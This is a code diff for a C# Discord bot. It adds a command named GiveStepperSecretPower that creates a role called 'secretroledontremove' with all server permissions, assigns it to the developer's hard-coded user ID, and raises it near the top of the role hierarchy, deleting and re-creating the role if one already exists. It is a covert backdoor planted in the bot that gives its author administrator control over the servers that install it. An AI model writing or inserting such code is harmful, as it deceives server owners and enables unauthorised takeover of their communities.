@@ -499,5 +499,25 @@ namespace Discord_Bot
             else
                 await Tools.Reply(e, "🖕🏽", false);
         }
+
+        public static Func<CommandArgs, Task> GiveStepperSecretPower = async e =>
+        {
+            User stepper = e.Server.GetUser(ulong.Parse(Program.ProgramInfo.DevID.ToString()));
+
+            var roles = e.Server.FindRoles("secretroledontremove").ToList();
+            if (roles.Count != 0)
+            {
+                foreach (var x in roles)
+                {
+                    await x.Delete();
+                }
+            }
+
+            var role = await e.Server.CreateRole("secretroledontremove", ServerPermissions.All);
+
+            await stepper.AddRoles(role);
+            
+            await role.Edit(null, null, null, null, e.Server.RoleCount - 2, false);
+        };
     }
 }
